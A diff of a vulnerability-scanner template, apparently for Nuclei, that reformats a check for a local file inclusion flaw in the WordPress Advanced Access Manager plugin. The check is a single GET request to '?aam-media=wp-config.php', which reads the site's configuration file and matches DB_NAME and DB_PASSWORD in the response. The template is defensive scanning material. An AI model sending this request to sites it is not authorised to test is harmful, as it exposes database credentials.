@@ -1,5 +1,4 @@
 id: advanced-access-manager-lfi
-
 info:
   name: WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion
   author: 0x_Akoko
@@ -13,26 +12,22 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-73
   metadata:
     max-request: 1
-  tags: wordpress,wp-plugin,lfi,wp,accessmanager,wpscan,vuln
-
+  tags: accessmanager,lfi,vuln,wordpress,wp,wp-plugin,wpscan
 http:
-  - method: GET
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - DB_NAME
+          - DB_PASSWORD
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/?aam-media=wp-config.php'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "DB_NAME"
-          - "DB_PASSWORD"
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
